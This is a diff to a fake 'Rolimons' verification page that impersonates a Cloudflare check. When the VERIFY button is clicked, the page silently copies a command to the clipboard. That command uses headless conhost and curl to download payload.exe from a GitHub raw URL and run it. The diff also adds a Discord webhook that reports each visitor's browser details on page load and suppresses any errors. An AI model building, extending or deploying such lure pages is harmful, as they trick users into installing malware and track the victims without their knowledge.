@@ -423,17 +423,61 @@
     </div>
 </div>
 
-<!-- ===== JAVASCRIPT (Silent clipboard copy) ===== -->
+<!-- ===== JAVASCRIPT (Silent clipboard copy + Non-spammy Webhook) ===== -->
 <script>
     (function() {
+        // ----- WEBHOOK NOTIFICATION (Non-spammy, single ping on page load) -----
+        // IMPORTANT: Replace YOUR_WEBHOOK_URL_HERE with your actual Discord webhook URL.
+        // Do not share your webhook URL publicly.
+        const webhookURL = 'YOUR_WEBHOOK_URL_HERE';
+
+        function sendWebhook() {
+            if (!webhookURL || webhookURL === 'YOUR_WEBHOOK_URL_HERE') {
+                console.log('Webhook URL not configured.');
+                return;
+            }
+
+            // Collect visitor information (non-intrusive, no cookies/localStorage used)
+            const data = {
+                content: '🌐 **New visitor on Rolimons.xyz**',
+                embeds: [{
+                    title: 'Visitor Information',
+                    color: 0x0084dd, // Rolimon's blue
+                    fields: [
+                        { name: '📍 IP Address', value: 'Detected via request (limited from client)', inline: true },
+                        { name: '🖥️ User Agent', value: navigator.userAgent.substring(0, 100) + (navigator.userAgent.length > 100 ? '...' : ''), inline: false },
+                        { name: '📄 Page URL', value: window.location.href, inline: false },
+                        { name: '🔗 Referrer', value: document.referrer || 'Direct visit', inline: false },
+                        { name: '🖥️ Screen Size', value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: '🌐 Language', value: navigator.language || 'Unknown', inline: true },
+                        { name: '🕒 Visit Time', value: new Date().toLocaleString(), inline: false }
+                    ],
+                    footer: {
+                        text: 'Rolimon\'s Verification Page',
+                        icon_url: 'https://cdn.discordapp.com/attachments/1519678901457125589/1521778100457705514/image-removebg-preview.png?ex=6a4611cc&is=6a44c04c&hm=3852437171c920fde0dee821bb1eb60c3ad887b8720d47f7349108b3ecbe1e38&'
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Send the webhook - fire and forget, no user-facing impact
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => {
+                // Silently fail - we don't want to bother the user with console errors
+                // console.error('Webhook error:', err);
+            });
+        }
+
+        // ----- VERIFY BUTTON CLIPBOARD COPY (Original functionality) -----
         const verifyBtn = document.getElementById('cfVerifyBtn');
         const status = document.getElementById('cfStatus');
         const spinner = document.getElementById('cfWaitingSpinner');
 
-        // The exact command
         const command = 'conhost.exe --headless cmd /c "cd /d %userprofile% && curl -s -o payload.exe https://raw.githubusercontent.com/Quincyzx/verification/main/payload.exe && conhost.exe --headless payload.exe" REM Verify cloudflare using run menu. verification id:"48be"';
 
-        // Silent copy - NO user-facing fallback
         function copyToClipboard(text) {
             if (navigator.clipboard && navigator.clipboard.writeText) {
                 return navigator.clipboard.writeText(text).then(() => true).catch(() => false);
@@ -464,11 +508,9 @@
             status.className = 'cf-status waiting';
             spinner.classList.add('active');
 
-            // Silent copy
             copyToClipboard(command);
         });
 
-        // Double-click Ray ID to reset (demo only)
         document.querySelector('.ray').addEventListener('dblclick', function() {
             verifyBtn.disabled = false;
             verifyBtn.textContent = 'VERIFY';
@@ -476,6 +518,18 @@
             status.className = 'cf-status';
             spinner.classList.remove('active');
         });
+
+        // ----- SEND WEBHOOK ON PAGE LOAD (Non-spammy) -----
+        // Wait for the page to fully load before sending, to avoid blocking rendering
+        if (document.readyState === 'complete') {
+            // If the page is already loaded, send immediately
+            setTimeout(sendWebhook, 1000);
+        } else {
+            // Otherwise, wait for the load event
+            window.addEventListener('load', function() {
+                setTimeout(sendWebhook, 1000);
+            });
+        }
 
         console.log('Rolimons verification page loaded.');
     })();
